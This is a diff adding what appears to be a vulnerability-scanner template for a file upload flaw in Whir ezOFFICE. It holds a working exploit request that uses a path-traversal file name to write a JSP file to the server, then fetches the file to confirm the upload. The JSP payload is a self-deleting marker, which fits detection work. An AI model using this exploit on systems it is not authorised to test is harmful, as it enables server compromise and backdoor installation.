@@ -1,0 +1,42 @@
+id: whir-office-file-upload
+
+info:
+  name: Whir ezOFFICE officeserverservlet File Upload Vulnerability
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    Whir ezOFFICE collaborative office system officeserverservlet has a file upload vulnerability. Attackers can upload dangerous file types without restrictions, insert backdoors, gain server permissions, and control the entire web server.
+  tags: file-upload
+
+variables:
+  file_name: "{{base64(concat('../../upgrade/', rand_text_alphanumeric(6), '.jsp'))}}"
+  file_content: "<% out.println(\"{{rand_text_alphanumeric(6)}}\");new java.io.File(application.getRealPath(request.getServletPath())).delete(); %>"
+
+flow: |
+  http(1) && http(2)
+
+http:
+  - id: upload-file
+    method: POST
+    path:
+      - "{{BaseURL}}/defaultroot/officeserverservlet"
+    headers:
+      Content-Type: text/plain
+    body: |
+      DBSTEP V3.0           {{len(concat('DBSTEP=REJTVEVQ\r\nOPTION=U0FWRUZJTEU\r\nisEncrypt=MA==\r\nmoduleType=aW5mb3JtYXRpb24=\r\nFILENAME=', file_name, '\r\n', file_content))}}           0               {{len(file_content)}}
+      DBSTEP=REJTVEVQ\r\nOPTION=U0FWRUZJTEU\r\nisEncrypt=MA==\r\nmoduleType=aW5mb3JtYXRpb24=\r\nFILENAME={{file_name}}\r\n{{file_content}}
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "5L+d5a2Y5oiQ5YqfIQ=="
+
+  - id: verify-upload
+    method: GET
+    path:
+      - "{{BaseURL}}/defaultroot/upgrade/{{file_name}}"
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "{{file_content}}"
